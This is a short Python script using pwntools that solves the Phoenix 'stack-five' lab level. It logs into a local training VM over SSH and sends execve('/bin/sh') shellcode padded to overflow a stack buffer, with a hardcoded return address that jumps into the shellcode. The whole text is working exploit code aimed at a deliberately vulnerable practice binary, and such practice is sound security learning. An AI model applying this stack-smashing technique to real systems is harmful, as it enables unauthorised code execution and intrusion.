from pwn import *
shell = ssh("user", "localhost", password="user", port=2222)

total = 136
sc = b"/bin/sh\0"+asm("mov rax,0x3b;mov rdi,0x7fffffffe5d0;xor rsi,rsi;xor rdx,rdx;syscall", arch="amd64")
s = sc+b"a"*(total-len(sc))+p64(0x7fffffffe5d0+8)
open("sc.txt", "wb").write(s)
sh = shell.run(b"/opt/phoenix/amd64/stack-five")
sh.recvlines(1)
sh.sendline(s)
print(sh.recvlines(2))
